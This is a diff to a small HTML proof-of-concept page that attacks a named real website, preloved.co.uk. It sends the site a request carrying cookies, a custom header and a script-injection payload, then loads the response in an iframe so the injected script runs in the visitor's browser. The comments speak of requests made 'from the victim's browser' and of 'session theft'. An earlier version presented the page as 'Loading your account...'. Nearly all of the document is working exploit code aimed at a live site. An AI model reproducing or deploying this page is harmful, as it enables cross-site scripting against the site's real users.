@@ -1,29 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Preloved XSS Poc</title>
+<title>XSS PoC</title>
 </head>
 <body>
-<h2>Loading your account...</h2>
+<h2>Testing XSS...</h2>
 
 <script>
-fetch('https://www.preloved.co.uk/controlpanel/testemail?p8t7i8=1--><script>alert(document.domain)</script>', {
+// Use fetch to send the request with X-Middleton header
+// This will make the request from the victim's browser
+fetch('https://www.preloved.co.uk/?--><script>alert(document.domain)<\/script>', {
     method: 'GET',
     headers: {
-        'X-Middleton': '1123asd213'
+        'X-Middleton': '12312asd'
     },
-    credentials: 'include'  // Send cookies
+    credentials: 'include'  // Include cookies to show session theft
 })
 .then(response => response.text())
 .then(data => {
-    // The XSS should execute automatically
-    document.getElementById('result').innerHTML = "XSS triggered!";
+    // Inject the response into the page to demonstrate the XSS
+    // The XSS payload is in the response, so we create an iframe to render it
+    var iframe = document.createElement('iframe');
+    iframe.srcdoc = data;
+    iframe.style.width = '100%';
+    iframe.style.height = '500px';
+    document.body.appendChild(iframe);
 })
 .catch(err => {
-    document.getElementById('result').innerHTML = "Error: " + err;
+    console.log('Error:', err);
 });
 </script>
 
-<div id="result"></div>
 </body>
 </html>
